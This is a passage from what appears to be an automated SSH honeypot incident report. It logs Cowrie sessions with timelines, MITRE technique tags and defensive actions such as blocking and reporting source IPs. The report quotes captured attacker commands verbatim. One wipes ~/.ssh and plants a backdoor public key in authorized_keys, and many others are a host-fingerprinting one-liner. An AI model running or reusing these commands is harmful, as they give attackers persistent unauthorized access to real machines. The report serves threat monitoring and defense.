| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:12:19` | `cowrie.session.connect` |
| `2026-07-28 14:12:20` | `cowrie.client.version` |
| `2026-07-28 14:12:20` | `cowrie.client.kex` |
| `2026-07-28 14:12:20` | `cowrie.login.success` |
| `2026-07-28 14:12:21` | `cowrie.session.params` |
| `2026-07-28 14:12:21` | `cowrie.command.input` |
| `2026-07-28 14:12:21` | `cowrie.command.failed` |
| `2026-07-28 14:12:21` | `cowrie.log.closed` |
| `2026-07-28 14:12:22` | `cowrie.session.params` |
| `2026-07-28 14:12:22` | `cowrie.command.input` |
| `2026-07-28 14:12:22` | `cowrie.session.file_download` |
| `2026-07-28 14:12:22` | `cowrie.log.closed` |
| `2026-07-28 14:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.193.162[.]238` to AbuseIPDB if not already reported
- [ ] Block `191.193.162[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec463b41b8a

| Field | Detail |
|---|---|
| **Source IP** | `191.193.162[.]238` |
| **First Seen** | 2026-07-28 14:12 |
| **Last Seen** | 2026-07-28 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:12:23` | `cowrie.session.connect` |
| `2026-07-28 14:12:23` | `cowrie.client.version` |
| `2026-07-28 14:12:23` | `cowrie.client.kex` |
| `2026-07-28 14:12:23` | `cowrie.login.success` |
| `2026-07-28 14:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.193.162[.]238` to AbuseIPDB if not already reported
- [ ] Block `191.193.162[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23c9543cbac

| Field | Detail |
|---|---|
| **Source IP** | `191.193.162[.]238` |
| **First Seen** | 2026-07-28 14:12 |
| **Last Seen** | 2026-07-28 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:12:23` | `cowrie.session.connect` |
| `2026-07-28 14:12:23` | `cowrie.client.version` |
| `2026-07-28 14:12:24` | `cowrie.client.kex` |
| `2026-07-28 14:12:24` | `cowrie.login.success` |
| `2026-07-28 14:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.193.162[.]238` to AbuseIPDB if not already reported
- [ ] Block `191.193.162[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91410fb9548

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:12 |
| **Last Seen** | 2026-07-28 14:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:12:39` | `cowrie.session.connect` |
| `2026-07-28 14:12:39` | `cowrie.client.version` |
| `2026-07-28 14:12:39` | `cowrie.client.kex` |
| `2026-07-28 14:12:42` | `cowrie.login.success` |
| `2026-07-28 14:12:44` | `cowrie.session.params` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.success` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.command.input` |
| `2026-07-28 14:12:44` | `cowrie.log.closed` |
| `2026-07-28 14:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa9b761ec533

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:13 |
| **Last Seen** | 2026-07-28 14:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:13:50` | `cowrie.session.connect` |
| `2026-07-28 14:13:51` | `cowrie.client.version` |
| `2026-07-28 14:13:51` | `cowrie.client.kex` |
| `2026-07-28 14:13:55` | `cowrie.login.success` |
| `2026-07-28 14:13:57` | `cowrie.session.params` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.success` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.command.input` |
| `2026-07-28 14:13:57` | `cowrie.log.closed` |
| `2026-07-28 14:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3324d0580b0f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:15 |
| **Last Seen** | 2026-07-28 14:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:15:00` | `cowrie.session.connect` |
| `2026-07-28 14:15:01` | `cowrie.client.version` |
| `2026-07-28 14:15:01` | `cowrie.client.kex` |
| `2026-07-28 14:15:03` | `cowrie.login.success` |
| `2026-07-28 14:15:05` | `cowrie.session.params` |
| `2026-07-28 14:15:05` | `cowrie.command.input` |
| `2026-07-28 14:15:05` | `cowrie.command.input` |
| `2026-07-28 14:15:05` | `cowrie.command.input` |
| `2026-07-28 14:15:05` | `cowrie.command.input` |
| `2026-07-28 14:15:05` | `cowrie.command.input` |
| `2026-07-28 14:15:05` | `cowrie.command.success` |
| `2026-07-28 14:15:05` | `cowrie.command.input` |
| `2026-07-28 14:15:06` | `cowrie.command.input` |
| `2026-07-28 14:15:06` | `cowrie.command.input` |
| `2026-07-28 14:15:06` | `cowrie.command.input` |
| `2026-07-28 14:15:06` | `cowrie.log.closed` |
| `2026-07-28 14:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c442671beb9e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:16 |
| **Last Seen** | 2026-07-28 14:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:16:09` | `cowrie.session.connect` |
| `2026-07-28 14:16:10` | `cowrie.client.version` |
| `2026-07-28 14:16:10` | `cowrie.client.kex` |
| `2026-07-28 14:16:12` | `cowrie.login.success` |
| `2026-07-28 14:16:14` | `cowrie.session.params` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.success` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:14` | `cowrie.command.input` |
| `2026-07-28 14:16:15` | `cowrie.log.closed` |
| `2026-07-28 14:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c460fbce7c2e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:17 |
| **Last Seen** | 2026-07-28 14:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:17:17` | `cowrie.session.connect` |
| `2026-07-28 14:17:18` | `cowrie.client.version` |
| `2026-07-28 14:17:18` | `cowrie.client.kex` |
| `2026-07-28 14:17:20` | `cowrie.login.success` |
| `2026-07-28 14:17:22` | `cowrie.session.params` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.success` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:22` | `cowrie.command.input` |
| `2026-07-28 14:17:23` | `cowrie.log.closed` |
| `2026-07-28 14:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f67d1c62d94

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:18 |
| **Last Seen** | 2026-07-28 14:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:18:27` | `cowrie.session.connect` |
| `2026-07-28 14:18:27` | `cowrie.client.version` |
| `2026-07-28 14:18:27` | `cowrie.client.kex` |
| `2026-07-28 14:18:29` | `cowrie.login.success` |
| `2026-07-28 14:18:31` | `cowrie.session.params` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.success` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:31` | `cowrie.command.input` |
| `2026-07-28 14:18:32` | `cowrie.log.closed` |
| `2026-07-28 14:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9ba883cb43

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-28 14:19 |
| **Last Seen** | 2026-07-28 14:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:19:35` | `cowrie.session.connect` |
| `2026-07-28 14:19:36` | `cowrie.client.version` |
| `2026-07-28 14:19:36` | `cowrie.client.kex` |
| `2026-07-28 14:19:39` | `cowrie.login.success` |
| `2026-07-28 14:19:40` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a271138f491a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:19 |
| **Last Seen** | 2026-07-28 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:19:37` | `cowrie.session.connect` |
| `2026-07-28 14:19:37` | `cowrie.client.version` |
| `2026-07-28 14:19:37` | `cowrie.client.kex` |
| `2026-07-28 14:19:39` | `cowrie.login.success` |
| `2026-07-28 14:19:40` | `cowrie.session.params` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.success` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:40` | `cowrie.command.input` |
| `2026-07-28 14:19:41` | `cowrie.log.closed` |
| `2026-07-28 14:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a36c2b9a9f28

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:20 |
| **Last Seen** | 2026-07-28 14:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:20:49` | `cowrie.session.connect` |
| `2026-07-28 14:20:49` | `cowrie.client.version` |
| `2026-07-28 14:20:49` | `cowrie.client.kex` |
| `2026-07-28 14:20:51` | `cowrie.login.success` |
| `2026-07-28 14:20:53` | `cowrie.session.params` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.success` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:53` | `cowrie.command.input` |
| `2026-07-28 14:20:54` | `cowrie.log.closed` |
| `2026-07-28 14:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014ac93c45cc

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-28 14:21 |
| **Last Seen** | 2026-07-28 14:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:21:05` | `cowrie.session.connect` |
| `2026-07-28 14:21:06` | `cowrie.client.version` |
| `2026-07-28 14:21:06` | `cowrie.client.kex` |
| `2026-07-28 14:21:08` | `cowrie.login.success` |
| `2026-07-28 14:21:09` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620b8e8210a0

| Field | Detail |
|---|---|
| **Source IP** | `14.153.235[.]237` |
| **First Seen** | 2026-07-28 14:21 |
| **Last Seen** | 2026-07-28 14:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:21:14` | `cowrie.session.connect` |
| `2026-07-28 14:21:15` | `cowrie.client.version` |
| `2026-07-28 14:21:15` | `cowrie.client.kex` |
| `2026-07-28 14:21:19` | `cowrie.login.success` |
| `2026-07-28 14:21:19` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.235[.]237` to AbuseIPDB if not already reported
- [ ] Block `14.153.235[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa0665e0a18

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:22 |
| **Last Seen** | 2026-07-28 14:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:22:01` | `cowrie.session.connect` |
| `2026-07-28 14:22:01` | `cowrie.client.version` |
| `2026-07-28 14:22:01` | `cowrie.client.kex` |
| `2026-07-28 14:22:03` | `cowrie.login.success` |
| `2026-07-28 14:22:05` | `cowrie.session.params` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.success` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:05` | `cowrie.command.input` |
| `2026-07-28 14:22:06` | `cowrie.log.closed` |
| `2026-07-28 14:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929b5da251e3

| Field | Detail |
|---|---|
